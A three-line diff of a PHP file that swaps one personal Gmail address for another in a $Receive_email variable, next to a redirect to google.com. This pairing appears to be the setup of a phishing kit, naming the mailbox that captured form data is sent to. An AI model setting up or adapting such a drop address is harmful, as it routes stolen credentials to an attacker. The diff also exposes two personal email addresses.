@@ -1,3 +1,3 @@
 <?php 
-$Receive_email="taadewusi4u@gmail.com";
+$Receive_email= "taiwoadekolaadewusi@gmail.com";
 $redirect="https://www.google.com/";
